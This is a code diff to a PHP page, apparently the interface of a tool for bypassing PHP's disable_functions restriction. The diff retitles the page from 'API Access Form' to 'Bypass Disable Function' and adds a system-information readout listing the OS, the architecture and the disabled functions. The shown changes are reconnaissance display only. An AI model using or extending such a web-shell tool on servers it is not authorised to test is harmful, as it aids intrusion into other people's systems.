@@ -60,12 +60,17 @@
     } else {
         $arch = "x64";
     }
-    $disabledFunctions = ini_get('disable_functions');
+    // handle if php_uname() is disabled
+    if (function_exists('php_uname')) {
+        $uname = php_uname();
+    } else {
+        $uname = "<strong>php_uname()</strong> is disabled.";
+    }
     ?>
 
     <body>
-        <div class="container mt-5">
-            <h1 class="mb-4">API Access Form</h1>
+        <div class="container mt-3">
+            <h2 class="mb-4 text-center">Bypass Disable Function</h2>
             <form method="post" id="apiForm">
                 <div class="mb-3">
                     <table class="table table-bordered">
@@ -76,6 +81,10 @@
                             </tr>
                         </thead>
                         <tbody>
+                            <tr>
+                                <th>System</th>
+                                <td><?php echo $uname; ?></td>
+                            </tr>
                             <tr>
                                 <th>Architecture</th>
                                 <td><?php echo $arch; ?></td>
@@ -207,15 +216,10 @@
                         $disabledFunctions = ini_get('disable_functions');
                         $disabledFunctions = explode(',', $disabledFunctions);
                         echo "<table class='table table-bordered'>";
-                        echo "<thead>";
-                        echo "<tr>";
-                        echo "<th scope='col'>Function</th>";
-                        echo "</tr>";
-                        echo "</thead>";
                         echo "<tbody>";
                         foreach ($disabledFunctions as $disabledFunction) {
                             echo "<tr>";
-                            echo "<td>" . $disabledFunction . "</td>";
+                            echo "<td class='text-danger'><strong>" . $disabledFunction . "</strong></td>";
                             echo "</tr>";
                         }
                         echo "</tbody>";
